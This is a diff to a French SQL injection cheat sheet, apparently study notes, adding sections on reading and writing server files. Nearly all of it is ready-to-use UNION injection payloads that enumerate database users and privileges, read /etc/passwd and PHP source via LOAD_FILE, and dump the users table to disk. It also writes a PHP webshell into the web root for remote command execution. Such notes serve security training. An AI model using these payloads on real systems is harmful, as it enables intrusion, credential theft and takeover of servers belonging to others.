@@ -358,7 +358,74 @@ Affiche les valeurs des colonnes “username” et “password” de la table �
 - Remplacer les colonnes de la requête par celles effectivement affichées sur le site cible.
 - On peux concaténer plusieurs colonnes avec `CONCAT(col1, ':', col2)` ou `group_concat()` si besoin d’afficher tout sur une ligne
 
+# Reading Files
 
+## 1. Découvrir l’utilisateur SQL courant
+
+`cn' UNION SELECT 1, user(), 3, 4-- -`:  
+Affiche l’utilisateur SQL courant.
+
+`cn' UNION SELECT 1, CURRENT_USER(), 3, 4-- -`:  
+Affiche l’utilisateur SQL utilisé pour l’authentification courante.
+
+`cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -`:  
+Liste tous les utilisateurs SQL.
+
+## 2. Vérifier les privilèges de l’utilisateur
+
+`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`:  
+Vérifie si l’utilisateur a le privilège “SUPER”.
+
+`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`:  
+Vérifie le privilège “SUPER” pour l’utilisateur root.
+
+`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`:  
+Liste tous les privilèges pour tous les utilisateurs.
+
+`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`:  
+Liste tous les privilèges de l’utilisateur 'root'@'localhost'.
+
+## 3. Lire des fichiers avec LOAD_FILE
+
+`cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -`:  
+Lit le contenu du fichier `/etc/passwd` sur le serveur (nécessite le privilège FILE).
+
+`cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -`:  
+Lit le contenu du fichier PHP source de la page courante.
+
+# Writing Files
+
+## 1. Vérifier le répertoire d’écriture avec secure_file_priv
+
+`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -`:  
+Affiche la valeur de `secure_file_priv` pour savoir où tu peux écrire des fichiers.
+
+## 2. Écrire du texte ou des données dans un fichier
+
+`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`:  
+Écrit le texte `file written successfully!` dans `/var/www/html/proof.txt` (test de write).
+
+`cn' union select "",'this is a test',"","" into outfile '/tmp/test.txt'-- -`:  
+Écrit le texte `this is a test` dans `/tmp/test.txt`.
+
+## 3. Exporter des données d’une table dans un fichier
+
+`SELECT * FROM users INTO OUTFILE '/tmp/credentials';`:  
+Dump la table `users` dans un fichier sur le serveur (à exécuter en SQL direct ou injection si possible).
+
+## 4. Écrire un webshell (PHP) sur le serveur
+
+`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`:  
+Crée un webshell PHP dans `/var/www/html/shell.php` pour obtenir une exécution de commandes (RCE).
+
+## 5. Astuces et notes
+
+- Privilège FILE requis + dossier autorisé par `secure_file_priv`.
+- Le fichier sera écrit avec les droits de l’utilisateur MySQL (souvent `mysql`).
+- Utiliser `""` pour éviter d’écrire des nombres inutiles dans le fichier.
+- Pour écrire un shell dans un dossier web, adapter le chemin au webroot (`/var/www/html/` ou selon le serveur).
+- Utiliser `FROM_BASE64("base64_data")` pour écrire des fichiers binaires ou longs (avancé).
+- Pour trouver le webroot, lire des fichiers de conf avec `LOAD_FILE()` (ex: `/etc/apache2/apache2.conf`).
 
 ## Ressources
 
